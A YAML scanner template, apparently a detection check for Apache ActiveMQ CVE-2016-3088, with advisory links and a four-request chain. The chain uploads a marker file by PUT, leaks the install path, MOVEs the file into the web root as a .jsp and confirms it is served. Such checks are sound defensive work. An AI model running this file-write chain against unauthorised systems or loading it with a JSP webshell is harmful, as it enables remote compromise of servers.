name: yaml-poc-apache-activemq-other-CVE-2016-3088
binding: e8725608-d399-457c-bbb2-3c5ef7c2ff1f
detail:
    author: system_user
    links:
        - http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt
        - http://rhn.redhat.com/errata/RHSA-2016-2036.html
        - http://www.ibm.com/support/docview.wss?uid=ibm10872142
        - http://www.securitytracker.com/id/1035951
        - http://www.zerodayinitiative.com/advisories/ZDI-16-356
        - http://www.zerodayinitiative.com/advisories/ZDI-16-357
        - https://lists.apache.org/thread.html/a859563f05fbe7c31916b3178c2697165bd9bbf5a65d1cf62aef27d2%40%3Ccommits.activemq.apache.org%3E
        - https://lists.apache.org/thread.html/a859563f05fbe7c31916b3178c2697165bd9bbf5a65d1cf62aef27d2@%3Ccommits.activemq.apache.org%3E
        - https://lists.apache.org/thread.html/f956ea38e4da2e2c1e7131e6f91e41754852f5a4861d1a14ca5ca78a%40%3Cusers.activemq.apache.org%3E
        - https://lists.apache.org/thread.html/f956ea38e4da2e2c1e7131e6f91e41754852f5a4861d1a14ca5ca78a@%3Cusers.activemq.apache.org%3E
        - https://lists.apache.org/thread.html/r6d03e45b81eab03580cf7f8bb51cb3e9a1b10a2cc0c6a2d3cc92ed0c%40%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/r6d03e45b81eab03580cf7f8bb51cb3e9a1b10a2cc0c6a2d3cc92ed0c@%3Cannounce.apache.org%3E
        - https://www-01.ibm.com/support/docview.wss?uid=ibm10872142
        - https://www.auscert.org.au/bulletins/75922
        - https://www.auscert.org.au/render.html?it=35010
        - https://www.exploit-db.com/exploits/42283/
    vulnerability:
        id: d03b39f4-5a8b-4c90-b97e-4d38f165422d
        level: critical
transport: http
set:
    filename: randomLowercase(6)
    fileContent: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: PUT
            path: /fileserver/{{filename}}.txt
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                {{fileContent}}
        expression: response.status == 204
    r1:
        request:
            cache: true
            method: GET
            path: /admin/test/index.jsp
            follow_redirects: false
        expression: response.status == 200
        output:
            search: '"activemq.home=(?P<home>.*?),".bsubmatch(response.body)'
            home: search["home"]
    r2:
        request:
            cache: true
            method: MOVE
            path: /fileserver/{{filename}}.txt
            headers:
                Destination: file://{{home}}/webapps/api/{{filename}}.jsp
            follow_redirects: false
        expression: response.status == 204
    r3:
        request:
            cache: true
            method: GET
            path: /api/{{filename}}.jsp
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(fileContent))
expression: r0() && r1() && r2() && r3()
